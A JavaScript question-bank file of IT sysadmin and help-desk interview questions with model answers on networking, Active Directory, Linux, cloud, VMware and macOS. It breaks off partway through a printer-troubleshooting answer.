// ── QUESTION BANK ─────────────────────────────────────────────────────────────
export const QUESTIONS = [
  // ── NETWORKING ──────────────────────────────────────────────────────────────
  {
    id: 1, category: "Networking", difficulty: "Easy",
    q: "What are the 7 layers of the OSI model?",
    a: `Physical → Data Link → Network → Transport → Session → Presentation → Application

Mnemonic: "Please Do Not Throw Sausage Pizza Away"

• Layer 1 – Physical: cables, NICs, electrical signals (Ethernet cable, fiber)
• Layer 2 – Data Link: MAC addresses, switches, frames (Ethernet, Wi-Fi 802.11)
• Layer 3 – Network: IP addresses, routing, packets (IP, ICMP, routers)
• Layer 4 – Transport: end-to-end delivery, ports, reliability (TCP, UDP)
• Layer 5 – Session: manages sessions/connections between apps
• Layer 6 – Presentation: data format, encryption/decryption (SSL/TLS, JPEG)
• Layer 7 – Application: what the user interacts with (HTTP, FTP, DNS, SMTP)

In troubleshooting, always start from Layer 1 upward.`,
  },
  {
    id: 2, category: "Networking", difficulty: "Easy",
    q: "What is the difference between TCP and UDP?",
    a: `TCP (Transmission Control Protocol):
• Connection-oriented — establishes a 3-way handshake (SYN, SYN-ACK, ACK)
• Reliable — guarantees delivery, retransmits lost packets
• Ordered — data arrives in the correct sequence
• Slower due to overhead
• Use cases: HTTP/HTTPS, SSH, FTP, email

UDP (User Datagram Protocol):
• Connectionless — no handshake, fire and forget
• Unreliable — no guarantee of delivery
• Faster with less overhead
• Use cases: DNS, VoIP, video streaming, online gaming, DHCP

Rule of thumb: TCP when accuracy matters, UDP when speed matters.`,
  },
  {
    id: 3, category: "Networking", difficulty: "Easy",
    q: "What is DHCP and how does it work?",
    a: `DHCP (Dynamic Host Configuration Protocol) automatically assigns IP addresses to devices on a network so you don't have to configure each one manually.

Process — DORA:
1. Discover — client broadcasts "I need an IP" (UDP port 68 → 67)
2. Offer — DHCP server offers an IP lease
3. Request — client says "I'll take that IP"
4. Acknowledge — server confirms the lease

DHCP assigns: IP address, subnet mask, default gateway, DNS server, lease duration

Port: UDP 67 (server) / 68 (client)

In an enterprise, the DHCP server is usually the Domain Controller or a dedicated server/router.`,
  },
  {
    id: 4, category: "Networking", difficulty: "Easy",
    q: "What is DNS and how does it work?",
    a: `DNS (Domain Name System) translates human-readable domain names into IP addresses.
Example: google.com → 142.250.185.46

Resolution process:
1. You type google.com → browser checks local cache
2. Asks local DNS resolver (usually your router or ISP)
3. If not cached → queries Root nameserver → TLD nameserver (.com) → Authoritative nameserver
4. Returns the IP address → browser connects

Key record types:
• A — maps domain to IPv4
• AAAA — maps domain to IPv6
• CNAME — alias (www → root domain)
• MX — mail server
• PTR — reverse lookup (IP → domain)
• NS — nameserver records

Port: UDP/TCP 53

Troubleshooting: nslookup google.com or dig google.com`,
  },
  {
    id: 5, category: "Networking", difficulty: "Easy",
    q: "What is the difference between a hub, switch, and router?",
    a: `Hub (Layer 1 — Physical):
• Broadcasts all traffic to every port
• No intelligence — creates collisions
• Obsolete, rarely used today

Switch (Layer 2 — Data Link):
• Learns MAC addresses and builds a MAC table
• Sends traffic only to the correct port (unicast)
• Reduces collisions, much more efficient
• Connects devices within the same network/VLAN

Router (Layer 3 — Network):
• Routes traffic between different networks using IP addresses
• Connects your LAN to the internet or other networks
• Makes routing decisions based on a routing table
• Performs NAT (Network Address Translation)

Memory aid: Hub = shouts to everyone. Switch = knows who's who on the LAN. Router = knows how to reach other networks.`,
  },
  {
    id: 6, category: "Networking", difficulty: "Medium",
    q: "What is a VLAN and why would you use one?",
    a: `VLAN (Virtual LAN) logically segments a physical network into separate broadcast domains without needing separate physical hardware.

Why use VLANs:
• Security — isolate sensitive departments (finance, HR) from general staff
• Performance — reduce broadcast traffic by limiting broadcast domains
• Flexibility — group users by function, not physical location
• Easier management — apply policies per VLAN

Example: One physical switch but three VLANs:
• VLAN 10 — Management
• VLAN 20 — Staff
• VLAN 30 — Guest Wi-Fi (isolated from internal network)

Trunk ports carry multiple VLANs (tagged with 802.1Q headers).
Access ports connect end devices to a single VLAN.

Configured on managed switches (Cisco, HP/Aruba, etc.).`,
  },
  {
    id: 7, category: "Networking", difficulty: "Medium",
    q: "What is NAT and why is it used?",
    a: `NAT (Network Address Translation) translates private IP addresses to a public IP address (and back) so that many devices can share one public IP.

Why it's needed:
• IPv4 has ~4.3 billion addresses — not enough for every device
• Private IP ranges (192.168.x.x, 10.x.x.x, 172.16-31.x.x) are not routable on the internet
• NAT maps internal private IPs to the router's single public IP

How it works:
• Your PC (192.168.1.10) sends request to google.com
• Router replaces source IP with its public IP (e.g. 81.2.3.4)
• Google replies to 81.2.3.4 → router looks up NAT table → forwards to 192.168.1.10

Types:
• PAT (Port Address Translation / NAT Overload) — most common, uses port numbers to track connections
• Static NAT — one private IP mapped permanently to one public IP (used for servers)`,
  },
  {
    id: 8, category: "Networking", difficulty: "Medium",
    q: "What common ports should every IT person know?",
    a: `Essential port numbers:

Service          Port    Protocol
─────────────────────────────────
FTP (data)        20     TCP
FTP (control)     21     TCP
SSH               22     TCP
Telnet            23     TCP
SMTP (email out)  25     TCP
DNS               53     UDP/TCP
DHCP server       67     UDP
DHCP client       68     UDP
HTTP              80     TCP
Kerberos          88     TCP/UDP
POP3             110     TCP
IMAP             143     TCP
HTTPS            443     TCP
SMB/Windows      445     TCP
LDAP             389     TCP
LDAPS            636     TCP
RDP             3389     TCP
MySQL           3306     TCP
RDP is critical for sysadmins — 3389. SSH is 22. DNS is 53. HTTPS is 443.`,
  },
  {
    id: 9, category: "Networking", difficulty: "Medium",
    q: "Walk me through troubleshooting a user who has no internet access.",
    a: `Use a top-down or bottom-up OSI approach. In practice, bottom-up works well:

1. Physical (L1): Is the cable plugged in? Are link lights on? Try a different cable/port.

2. IP address (L3): Run ipconfig (Windows) / ip addr (Linux)
   • Got 169.254.x.x? → DHCP failure (APIPA address) — check DHCP server
   • Got 0.0.0.0? → No IP at all

3. Default gateway: ping [gateway IP] — can you reach the router?
   • No → problem is between PC and router (cable, switch, Wi-Fi, VLAN)

4. DNS: ping 8.8.8.8 — can you reach the internet by IP?
   • Yes → DNS issue. Check DNS settings, run nslookup google.com
   • No → routing problem or ISP issue

5. Browser: if ping works but browser doesn't → proxy/firewall/browser issue

6. Check if others are affected → isolate: single user vs whole network

Always document steps and resolution in the ticketing system.`,
  },
  {
    id: 10, category: "Networking", difficulty: "Hard",
    q: "What is subnetting? How do you calculate a subnet?",
    a: `Subnetting divides a large network into smaller logical sub-networks for better management, security, and efficiency.

Key concept: The subnet mask defines which part of an IP is the network vs. host.
• 255.255.255.0 = /24 → 254 usable hosts
• 255.255.255.128 = /25 → 126 usable hosts
• 255.255.255.192 = /26 → 62 usable hosts

CIDR notation: 192.168.1.0/24
• /24 means 24 bits for network, 8 bits for hosts
• 2^8 = 256 addresses, minus 2 (network + broadcast) = 254 usable

Example — /26:
• Bits for hosts: 32-26 = 6 → 2^6 = 64 addresses → 62 usable
• Block size: 64 → subnets: .0, .64, .128, .192
• .0/26 → hosts: .1 to .62, broadcast .63

Quick powers of 2: /30=4(2 hosts), /29=8(6), /28=16(14), /27=32(30), /26=64(62), /25=128(126), /24=256(254)

In practice: use ipcalc or Subnet calculator tools. Know the logic for interviews.`,
  },

  // ── WINDOWS / ACTIVE DIRECTORY ───────────────────────────────────────────────
  {
    id: 11, category: "Windows / AD", difficulty: "Easy",
    q: "What is Active Directory (AD)?",
    a: `Active Directory is Microsoft's directory service that centralizes authentication, authorization, and management of users, computers, and resources in a Windows domain network.

What it does:
• Single Sign-On (SSO) — users log in once and access network resources
• Centralized user/computer management
• Group Policy enforcement across all machines
• Authentication via Kerberos (primary) or NTLM (legacy)

Structure (hierarchical):
Forest → Domain(s) → Organizational Units (OUs) → Users / Computers / Groups

Key components:
• Domain Controller (DC) — server running AD DS, holds the directory database (NTDS.DIT)
• LDAP — protocol used to query AD
• Kerberos — authentication protocol (port 88)
• DNS — AD relies heavily on DNS (SRV records)

Common tools: Active Directory Users and Computers (ADUC), AD Administrative Center, PowerShell (Get-ADUser, etc.)`,
  },
  {
    id: 12, category: "Windows / AD", difficulty: "Easy",
    q: "What is a Domain Controller (DC)?",
    a: `A Domain Controller is a Windows Server that runs Active Directory Domain Services (AD DS). It is the heart of a Windows domain.

Responsibilities:
• Authenticates users and computers (validates credentials)
• Stores and replicates the AD database (NTDS.DIT)
• Enforces Group Policy
• Manages Kerberos tickets
• Runs DNS (usually) and DHCP (sometimes)

Key concepts:
• Primary DC (PDC Emulator) — one DC holds the PDC Emulator FSMO role, handles time sync and password changes
• Best practice: minimum 2 DCs per domain for redundancy
• Global Catalog (GC) — a DC that holds a partial replica of all objects in the forest for cross-domain searches

If the DC goes down: users can't log in to the domain (cached credentials may work temporarily), GPOs won't apply, DHCP/DNS may fail.`,
  },
  {
    id: 13, category: "Windows / AD", difficulty: "Easy",
    q: "What is Group Policy (GPO)?",
    a: `Group Policy Objects (GPOs) are a collection of settings applied to users and computers in an AD domain, enforced by the Domain Controller.

What you can control with GPO:
• Password policies (complexity, length, expiry)
• Software deployment and restriction
• Drive/printer mapping
• Desktop wallpaper, screensaver
• Security settings (firewall, UAC, BitLocker)
• Login/logoff scripts
• Browser homepage
• Disable USB drives

GPO is linked to: Sites → Domains → OUs (most specific wins)
Processing order: Local → Site → Domain → OU (LSDOU)

Key commands:
• gpupdate /force — immediately apply GPO changes
• gpresult /r — show which GPOs are applied to current user/computer
• rsop.msc — Resultant Set of Policy (GUI view)

GPOs make it possible to manage thousands of machines from one place.`,
  },
  {
    id: 14, category: "Windows / AD", difficulty: "Easy",
    q: "What is the difference between a workgroup and a domain?",
    a: `Workgroup:
• Peer-to-peer network — no central server
• Each PC manages its own users and resources locally
• Maximum ~10-20 computers (not scalable)
• Each user account exists only on that one machine
• No centralized policy, no single sign-on
• Used in home networks and very small offices

Domain:
• Client-server model — Domain Controller manages everything
• Centralized authentication — one set of credentials works everywhere
• Scales to thousands of users and computers
• Group Policy applied centrally
• Users, computers, and resources managed from one place
• Used in businesses and enterprises

Key sign: if a PC is "joined to the domain," its login screen says DOMAIN\\username instead of just username. You can check with: System Properties → Computer Name → Domain.`,
  },
  {
    id: 15, category: "Windows / AD", difficulty: "Medium",
    q: "A user is locked out of their account. Walk me through what you do.",
    a: `Step 1: Verify it's an account lockout (not a wrong password or expired password).
• Check Event Viewer on the DC → Windows Logs → Security → Event ID 4740 (account locked out)
• Or in ADUC: find the user → Account tab → "Account is locked out" checkbox
• Tool: Microsoft Account Lockout Tools (LockoutStatus.exe)

Step 2: Identify the source of lockouts.
• Event ID 4740 includes the "Caller Computer Name" — the machine causing the lockouts
• Common causes: saved credentials (old password), a service running as that user, a mapped drive, a mobile device with old password, or RDP sessions

Step 3: Unlock the account.
• ADUC: right-click user → Properties → Account tab → uncheck "Account is locked out"
• PowerShell: Unlock-ADAccount -Identity username

Step 4: Fix the root cause before the user logs in again, or they'll get locked out again.

Step 5: If password is expired too, reset it and force change at next login.

Always log the resolution in the ticket.`,
  },
  {
    id: 16, category: "Windows / AD", difficulty: "Medium",
    q: "What is the Windows Registry?",
    a: `The Windows Registry is a hierarchical database that stores configuration settings and options for the Windows OS and installed applications.

Structure — 5 root hives:
• HKEY_LOCAL_MACHINE (HKLM) — system-wide settings, hardware, software installed for all users
• HKEY_CURRENT_USER (HKCU) — settings for the currently logged-in user
• HKEY_USERS (HKU) — all loaded user profiles
• HKEY_CLASSES_ROOT (HKCR) — file associations, COM objects
• HKEY_CURRENT_CONFIG (HKCC) — current hardware profile

Access: regedit.exe

Sysadmin use cases:
• Fixing application issues that require registry edits
• Deploying settings via GPO (Registry policy)
• Removing malware persistence (startup entries in HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run)
• Troubleshooting OS behavior

⚠️ Always export/backup before editing: File → Export in regedit. A wrong edit can break Windows.`,
  },
  {
    id: 17, category: "Windows / AD", difficulty: "Easy",
    q: "What are NTFS permissions and how do they differ from Share permissions?",
    a: `NTFS Permissions (local file system level):
• Applied to files and folders on NTFS volumes
• Apply locally AND over the network
• Granular: Full Control, Modify, Read & Execute, List Folder, Read, Write
• Inherited from parent folder by default
• Set via: right-click → Properties → Security tab

Share Permissions (network access level):
• Only apply when accessing over the network (SMB share)
• Coarser: Full Control, Change, Read
• Set via: right-click → Properties → Sharing → Advanced Sharing → Permissions

When both apply (accessing a shared folder over the network):
The MORE restrictive permission wins.

Example: Share = Full Control, NTFS = Read → effective = Read

Best practice: Give Everyone "Full Control" on Share permissions, then control access finely with NTFS permissions. This simplifies management.`,
  },
  {
    id: 18, category: "Windows / AD", difficulty: "Medium",
    q: "What key Windows command-line tools should every sysadmin know?",
    a: `Networking:
• ipconfig /all — shows IP, MAC, DNS, gateway, DHCP server
• ipconfig /release && /renew — release and renew DHCP lease
• ipconfig /flushdns — clear DNS cache
• ping [host] — test connectivity (ICMP)
• tracert [host] — trace route to destination
• nslookup [domain] — DNS query tool
• netstat -an — show active connections and listening ports
• pathping — combines ping + tracert
• arp -a — show ARP table (IP-to-MAC mappings)

System:
• gpupdate /force — apply Group Policy immediately
• gpresult /r — show applied GPOs
• systeminfo — OS version, uptime, hotfixes
• tasklist / taskkill — list/kill processes
• net user [name] — show/manage user account
• net localgroup administrators — list local admins
• sfc /scannow — System File Checker (repairs corrupted Windows files)
• chkdsk — check disk for errors
• eventvwr — open Event Viewer
• msconfig — startup and boot options
• mstsc — Remote Desktop Client`,
  },

  // ── LINUX ────────────────────────────────────────────────────────────────────
  {
    id: 19, category: "Linux", difficulty: "Easy",
    q: "What are the most important Linux commands for a sysadmin?",
    a: `File & Navigation:
• ls -la — list all files with permissions
• cd, pwd, mkdir, rm -rf, cp, mv, touch
• cat, less, head, tail -f (follow log files in real-time)
• find /path -name "file" — search for files
• grep "pattern" file — search inside files

Permissions:
• chmod 755 file — set permissions
• chown user:group file — change owner
• id — show current user's UID/GID/groups

Processes:
• ps aux — list all running processes
• top / htop — interactive process monitor
• kill -9 [PID] — force kill process
• systemctl status/start/stop/restart [service]

Networking:
• ip addr / ifconfig — show network interfaces
• ping, traceroute, ss -tulnp (open ports), netstat -an
• curl / wget — fetch URLs

Disk & Storage:
• df -h — disk usage per filesystem
• du -sh /path — directory size
• lsblk — list block devices
• mount / umount

Logs:
• journalctl -u [service] -f — follow service logs
• tail -f /var/log/syslog`,
  },
  {
    id: 20, category: "Linux", difficulty: "Easy",
    q: "How do Linux file permissions work? (chmod, chown)",
    a: `Every file has permissions for 3 groups: Owner | Group | Others
Each group has 3 bits: Read (r=4), Write (w=2), Execute (x=1)

Example: -rwxr-xr--
• - = file type (- = file, d = directory, l = symlink)
• rwx = owner can read, write, execute
• r-x = group can read and execute
• r-- = others can only read

Numeric (octal) representation:
• 7 = rwx (4+2+1)
• 6 = rw- (4+2)
• 5 = r-x (4+1)
• 4 = r-- (4)

chmod examples:
• chmod 755 script.sh → owner:rwx, group:r-x, others:r-x (typical for executables)
• chmod 644 file.txt → owner:rw-, group:r--, others:r-- (typical for files)
• chmod 700 private/ → only owner has access
• chmod +x script.sh → add execute for all
• chmod -R 755 /dir → recursive

chown:
• chown john file.txt → change owner to john
• chown john:developers file.txt → change owner and group
• chown -R john:john /home/john → recursive`,
  },
  {
    id: 21, category: "Linux", difficulty: "Easy",
    q: "What is systemd and how do you manage services with it?",
    a: `systemd is the init system and service manager used in modern Linux distributions (Ubuntu 16+, CentOS 7+, RHEL 7+, Debian 8+).

It replaced older init systems (SysV init, Upstart) and provides:
• Parallel service startup (faster boot)
• Dependency management between services
• Logging via journald
• Socket and timer activation

Key commands:
systemctl status nginx         # check service status
systemctl start nginx          # start
systemctl stop nginx           # stop
systemctl restart nginx        # restart
systemctl reload nginx         # reload config without downtime
systemctl enable nginx         # start on boot
systemctl disable nginx        # don't start on boot
systemctl is-active nginx      # quick check: active/inactive
systemctl list-units --type=service   # list all services

View logs:
journalctl -u nginx            # all logs for nginx
journalctl -u nginx -f         # follow live
journalctl -u nginx --since "1 hour ago"
journalctl -b                  # logs since last boot`,
  },
  {
    id: 22, category: "Linux", difficulty: "Medium",
    q: "What is the difference between sudo and su?",
    a: `su (switch user):
• Switches to another user's full environment
• su - (with dash) = full login shell (loads that user's environment, PATH, etc.)
• su (without dash) = switches user but keeps current environment
• Requires the TARGET user's password
• su - root → become root (needs root password)
• Common in older RHEL/CentOS systems where root password is known

sudo (superuser do):
• Runs a single command with elevated privileges
• Requires YOUR OWN password (not root's)
• Access controlled by /etc/sudoers (edited with visudo)
• Logs every sudo command (audit trail) → /var/log/auth.log or journalctl
• sudo -i → get an interactive root shell
• sudo -u john command → run as user john

Why sudo is preferred in enterprises:
• Root password doesn't need to be shared
• Granular control (user X can only run specific commands)
• Full audit trail of who ran what
• Ubuntu and most modern distros disable root login by default and use sudo

Check who has sudo: cat /etc/sudoers or getent group sudo`,
  },
  {
    id: 23, category: "Linux", difficulty: "Medium",
    q: "How does SSH work and how do you set up key-based authentication?",
    a: `SSH (Secure Shell) is an encrypted protocol for secure remote access to systems. Port 22, TCP.

How it works:
1. Client initiates connection → server sends its public host key
2. Client verifies server identity (first time: "Are you sure? yes/no")
3. They negotiate encryption algorithms and establish encrypted tunnel
4. Client authenticates (password or key-based)
5. Secure session established

Key-based authentication (preferred over passwords):
1. Generate key pair on CLIENT:
   ssh-keygen -t ed25519 -C "your@email.com"
   → Creates ~/.ssh/id_ed25519 (private) and ~/.ssh/id_ed25519.pub (public)

2. Copy public key to SERVER:
   ssh-copy-id user@server
   → Adds to server's ~/.ssh/authorized_keys

3. Connect:
   ssh user@server (no password needed)

Why key-based is better:
• No password to brute-force
• Private key never leaves your machine
• Can disable password auth entirely in /etc/ssh/sshd_config:
  PasswordAuthentication no
  PermitRootLogin no

Common options:
ssh -p 2222 user@host   # non-standard port
ssh -i ~/.ssh/mykey user@host   # specific key
ssh -L 8080:localhost:80 user@host   # port forwarding`,
  },
  {
    id: 24, category: "Linux", difficulty: "Easy",
    q: "What are package managers in Linux and how do you use them?",
    a: `Package managers handle installation, update, and removal of software and their dependencies.

APT (Debian/Ubuntu):
apt update                    # refresh package list
apt upgrade                   # upgrade installed packages
apt install nginx             # install package
apt remove nginx              # remove (keep config)
apt purge nginx               # remove + delete config
apt search nginx              # search packages
apt show nginx                # package details
dpkg -l                       # list all installed packages

YUM / DNF (RHEL/CentOS/Fedora):
yum update / dnf update       # update all
yum install httpd             # install
yum remove httpd              # remove
yum search httpd              # search
rpm -qa                       # list all installed (RPM packages)

Zypper (SUSE/openSUSE):
zypper install package        # install
zypper update                 # update all

Snap & Flatpak (distro-agnostic):
snap install vlc              # universal packages in sandboxed containers

Always run apt update before apt install to get the latest package lists.
In production, test updates in staging before applying to prod.`,
  },

  // ── CLOUD ────────────────────────────────────────────────────────────────────
  {
    id: 25, category: "Cloud", difficulty: "Easy",
    q: "What is the difference between IaaS, PaaS, and SaaS?",
    a: `These are the 3 main cloud service models, defined by how much the provider manages vs. you.

IaaS (Infrastructure as a Service):
• Provider gives you: virtualized hardware (VMs, storage, networking)
• You manage: OS, runtime, apps, data
• Examples: AWS EC2, Google Compute Engine, Azure VMs
• Use case: you want full control, like running your own servers but in the cloud

PaaS (Platform as a Service):
• Provider gives you: infrastructure + OS + runtime + middleware
• You manage: your application code and data only
• Examples: Google App Engine, Heroku, Azure App Service
• Use case: developers who just want to deploy code without managing servers

SaaS (Software as a Service):
• Provider manages everything
• You just use the application via browser
• Examples: Gmail, Salesforce, Office 365, Slack
• Use case: end users — no infrastructure management at all

Memory aid: Pizza-as-a-Service analogy.
• IaaS = you bake the pizza (kitchen provided)
• PaaS = pizza is half-made (just add toppings)
• SaaS = pizza delivered, you just eat it`,
  },
  {
    id: 26, category: "Cloud", difficulty: "Medium",
    q: "What is IAM (Identity and Access Management) in cloud?",
    a: `IAM is the cloud system that controls WHO can do WHAT on WHICH resources.

Core concepts (consistent across GCP, AWS, Azure):
• Principal (Who): user, service account, group
• Role/Permission (What): what actions are allowed (read, write, delete, admin)
• Resource (Which): the specific resource (bucket, VM, database)

Principle of Least Privilege: Grant only the minimum permissions needed. Never use admin/owner roles unless absolutely necessary.

GCP IAM:
• Roles: Primitive (Owner/Editor/Viewer), Predefined, Custom
• Service Accounts: identities for applications/VMs to access GCP APIs
• gcloud projects add-iam-policy-binding PROJECT --member=user:email --role=roles/viewer

AWS IAM:
• Users, Groups, Roles, Policies (JSON documents)
• Roles can be assumed by EC2 instances, Lambda functions
• Never use root account for day-to-day work

Azure:
• Role-Based Access Control (RBAC)
• Managed Identities for services

Key principle: Audit IAM regularly. Remove unused accounts. Use groups/roles instead of individual permissions.`,
  },
  {
    id: 27, category: "Cloud", difficulty: "Medium",
    q: "What is a VPC (Virtual Private Cloud)?",
    a: `A VPC is a private, isolated section of the cloud where you define your own virtual network — IP ranges, subnets, routing, and security rules.

Think of it as: your own private data center inside the cloud provider.

Key components:
• Subnets — divide the VPC into smaller segments (public vs private)
  - Public subnet: has route to Internet Gateway (internet-facing)
  - Private subnet: no direct internet access (databases, internal servers)
• Internet Gateway — allows public subnet resources to reach the internet
• NAT Gateway — allows private subnet resources to initiate outbound internet connections
• Route Tables — control where traffic is directed
• Security Groups — stateful firewall at the instance level (allow rules only)
• Network ACLs — stateless firewall at the subnet level (allow + deny rules)

GCP equivalent: VPC with firewall rules, Cloud NAT, Cloud Router
Azure equivalent: Virtual Network (VNet)

Best practice:
• Place databases and app servers in private subnets
• Only load balancers and bastion hosts in public subnets
• Use security groups to restrict access between tiers`,
  },
  {
    id: 28, category: "Cloud", difficulty: "Easy",
    q: "What is the difference between a virtual machine and a container?",
    a: `Virtual Machine (VM):
• Full OS virtualized on top of a hypervisor
• Includes its own OS kernel, libraries, and app
• Heavier — GBs of disk, minutes to start
• Stronger isolation — complete OS boundary
• Examples: AWS EC2, GCP Compute Engine, VMware VM
• Good for: running full OS, legacy apps, anything needing OS-level customization

Container:
• Shares the host OS kernel
• Packages only the app and its dependencies
• Lightweight — MBs, starts in seconds
• Less isolated than VMs (shares kernel)
• Examples: Docker, Kubernetes pods
• Good for: microservices, fast deployment, consistent environments

Analogy:
• VM = house with its own foundation, plumbing, electricity
• Container = apartment in a building (shares infrastructure)

In practice, both are used together:
• VMs provide the infrastructure
• Containers run on VMs (e.g., Kubernetes cluster running on EC2/GCE VMs)`,
  },

  // ── VMWARE / VIRTUALIZATION ──────────────────────────────────────────────────
  {
    id: 29, category: "VMware", difficulty: "Easy",
    q: "What is a hypervisor? What is the difference between Type 1 and Type 2?",
    a: `A hypervisor (Virtual Machine Monitor) is software that creates and manages virtual machines, allowing multiple OS instances to run on one physical host.

Type 1 — Bare-Metal Hypervisor:
• Runs directly on physical hardware (no host OS)
• More efficient and performant — direct hardware access
• Used in enterprise/production environments
• Examples: VMware ESXi, Microsoft Hyper-V, Citrix XenServer, KVM (kernel-level)

Type 2 — Hosted Hypervisor:
• Runs on top of an existing host OS (Windows, macOS, Linux)
• Less efficient — one extra layer
• Used for desktop/development/testing
• Examples: VMware Workstation, Oracle VirtualBox, Parallels Desktop (Mac)

Memory aid: Type 1 = talks directly to hardware (no middleman). Type 2 = goes through a host OS.

In enterprise IT, you'll almost always deal with Type 1 (ESXi). When a colleague says "spin up a VM" in enterprise, they mean on the VMware ESXi/vSphere infrastructure.`,
  },
  {
    id: 30, category: "VMware", difficulty: "Medium",
    q: "What is VMware vSphere, ESXi, and vCenter — and how do they relate?",
    a: `VMware vSphere is the enterprise virtualization platform (the full product suite).

ESXi (Elastic Sky X Integrated):
• The hypervisor — bare-metal Type 1 hypervisor installed directly on physical servers
• Runs virtual machines (VMs)
• Each physical server runs one ESXi instance
• Can be managed via web UI (Host Client) or vCenter
• Free version exists (limited features)

vCenter Server:
• Centralized management platform for multiple ESXi hosts
• Allows you to manage dozens or hundreds of ESXi hosts from one interface
• Provides advanced features: vMotion, HA, DRS, snapshots at scale
• Web interface: vSphere Client (HTML5)
• Without vCenter: you manage each ESXi host individually

Relationship: ESXi = the worker (runs VMs). vCenter = the manager (controls all workers).

Key vSphere concepts:
• Datacenter → Cluster → ESXi Hosts → VMs
• Datastore: where VM files (.vmdk) are stored (local disk, SAN, NFS)
• Port Group: virtual networking (like a VLAN for VMs)
• vSwitch (vDS): virtual switch connecting VMs to physical network`,
  },
  {
    id: 31, category: "VMware", difficulty: "Medium",
    q: "What is vMotion and when would you use it?",
    a: `vMotion is a VMware technology that migrates a running virtual machine from one ESXi host to another with zero downtime — while the VM stays fully operational.

How it works:
1. VM's memory is mirrored to the destination host
2. Once in sync, a brief (sub-second) switchover happens
3. VM continues running on the new host
4. The whole process is transparent to the end user

Use cases:
• Host maintenance: evacuate VMs before taking a server down for patching/hardware work
• Load balancing: move VMs to less-loaded hosts (DRS does this automatically)
• Avoid hardware failure: proactively move VMs off a failing host

Requirements:
• Shared storage (both hosts must see the same datastore) — unless using Storage vMotion
• Compatible CPUs between hosts (or EVC mode enabled)
• Network connectivity between hosts (dedicated vMotion VMkernel interface)

Storage vMotion: migrates a running VM's disk files from one datastore to another (no shared storage required).

DRS (Distributed Resource Scheduler): uses vMotion automatically to balance load across a cluster.`,
  },
  {
    id: 32, category: "VMware", difficulty: "Easy",
    q: "What is a VM snapshot and what are the risks of leaving them too long?",
    a: `A VM snapshot captures the exact state of a VM at a point in time — memory, disk, and settings.

Used for:
• Before patching/updates: take snapshot → apply patch → if it fails, revert instantly
• Before risky changes to an application or config
• Quick rollback option

How it works:
• Original disk becomes read-only
• All new writes go to a "delta" file (child disk)
• Reverting: discard the delta file → back to original state
• Deleting snapshot: merges delta into base disk (this takes time and I/O)

Risks of leaving snapshots too long:
• Delta files grow with every write → can fill the datastore
• Performance degrades as the snapshot chain gets longer
• If the datastore fills up → the VM may crash
• Large delta files take a long time to commit (and use heavy I/O)

Best practices:
• Keep snapshots for no more than 24-72 hours
• Monitor snapshot size in vCenter
• Never use snapshots as a backup strategy (they are not backups)
• Real backups: Veeam, Commvault, VMware Data Recovery`,
  },

  // ── MACOS / DESKTOP ──────────────────────────────────────────────────────────
  {
    id: 33, category: "macOS", difficulty: "Easy",
    q: "What should an IT person know about supporting macOS in an enterprise?",
    a: `macOS in enterprise is common in creative, tech, and startup environments.

Key management tools:
• MDM (Mobile Device Management): Jamf Pro (most common), Mosyle, Kandji, Apple Business Manager (ABM)
• ABM: Apple's portal for purchasing devices, deploying apps via VPP, and zero-touch enrollment

Common admin tasks:
• Enrollment: devices auto-enroll into MDM via ABM when first set up
• Pushing apps: via MDM (App Store apps via VPP, or custom .pkg files)
• Remote lock/wipe: via MDM (critical for lost devices)
• FileVault: built-in full-disk encryption — enable via MDM, escrow key centrally

macOS Terminal essentials:
• Most Linux commands work (ls, cd, grep, ssh, ping, etc.)
• Homebrew: package manager (brew install htop)
• networksetup -listallhardwareports — list network interfaces
• system_profiler SPHardwareDataType — hardware info
• sudo dscl . -passwd /Users/username — reset local password
• ditto, rsync — file copying tools

Key differences from Windows:
• No Group Policy (MDM policies instead)
• No Active Directory native join (use Jamf Connect or NoMAD for AD integration)
• Keychain instead of Windows Credential Manager
• .dmg, .pkg installers instead of .exe/.msi`,
  },

  // ── HELP DESK / TROUBLESHOOTING ──────────────────────────────────────────────
  {
    id: 34, category: "Help Desk", difficulty: "Easy",
    q: "A user says their computer is very slow. How do you troubleshoot it?",
    a: `Don't jump to conclusions — gather info first.

Step 1: Ask the user:
• When did this start? After an update, install, or change?
• Is it slow for everything or just specific apps?
• Any error messages?

Step 2: Check resources (Task Manager / Activity Monitor):
• CPU: high sustained usage? What process?
• RAM: high usage? Running out of memory?
• Disk: 100% disk usage is a common Windows 10/11 issue (SSD health, Windows Search, Superfetch/SysMain)
• Temp: check GPU-Z/HWMonitor for thermal throttling

Step 3: Common fixes:
• Too many startup programs → msconfig or Task Manager Startup tab
• Malware scan → Windows Defender, Malwarebytes
• Full disk → clean up, remove old files, Disk Cleanup, empty recycle bin
• Fragmented HDD → Defragment (don't defrag SSDs)
• Old or failing hardware → check SMART status (CrystalDiskInfo for disk health)
• Outdated drivers → especially GPU drivers
• RAM issue → run MemTest86

Step 4: If software-side is clean → consider hardware upgrade (RAM, SSD) or OS reinstall.

Always document in the ticket what you found and fixed.`,
  },
  {
    id: 35, category: "Help Desk", difficulty: "Easy",
    q: "What is ITIL and why does it matter in IT support?",
    a: `ITIL (Information Technology Infrastructure Library) is a framework of best practices for delivering IT services.

Core concepts relevant to help desk:
• Incident: unexpected interruption to a service (printer not working, app crash)
• Problem: the underlying root cause of one or more incidents
• Change: planned modification to IT infrastructure (requires approval process)
• Service Request: standard request from a user (password reset, new software)
• SLA (Service Level Agreement): defines response and resolution time targets

ITIL processes you'll use daily:
• Incident Management: log, categorize, prioritize, resolve incidents quickly
• Change Management: CAB (Change Advisory Board) approves risky changes
• Knowledge Management: document solutions in a knowledge base

Priority levels (typical):
• P1 — Critical: whole company affected, immediate response
• P2 — High: significant impact, response < 1 hour
• P3 — Medium: single user affected, response < 4 hours
• P4 — Low: minor issue, response < 1 business day

Why it matters in interviews: Saying you follow ITIL processes shows professionalism and that you understand structured IT operations — it differentiates you from self-taught candidates.`,
  },
  {
    id: 36, category: "Help Desk", difficulty: "Medium",
    q: "A user can't print. Walk me through your troubleshooting steps.",
    a: `Step 1: Reproduce and scope the issue.
• Is it just this user or everyone? → if everyone: printer or print server issue
• Is it all printers or just this one?
• Has it worked before on this machine?

Step 2: Check the basics.
• Is the printer on and showing "Ready"? (not jammed, not low toner)
• Is it connected? (Network printer: ping the printer IP. USB: device showing in Device Manager?)
• Is the user's PC connected to the network?

Step 3: Check the print queue.
• Settings → Printers → Select printer → Open print queue
• Are jobs stuck in the queue? Clear them.
• Restart the Print Spooler service:
  services.msc → Print Spooler → Restart
